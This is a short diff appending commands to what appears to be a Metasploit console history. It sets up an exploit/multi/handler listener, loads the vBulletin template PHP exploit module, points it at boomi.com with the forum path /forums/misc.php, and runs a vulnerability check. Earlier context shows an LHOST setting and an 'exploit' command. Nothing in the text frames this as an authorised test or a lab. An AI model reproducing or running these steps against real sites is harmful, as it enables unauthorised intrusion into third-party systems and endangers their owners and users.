@@ -43,3 +43,16 @@ set LHOST 192.168.1.101
 exploit
 show exploits
 quit
+use exploit/multi/handler
+show payloads
+show payloads
+show payloads
+quit
+quit
+use unix/webapp/php_vbulletin_template
+show options
+set rhost boomi.com
+set path /forums/misc.php
+show options
+check
+quit
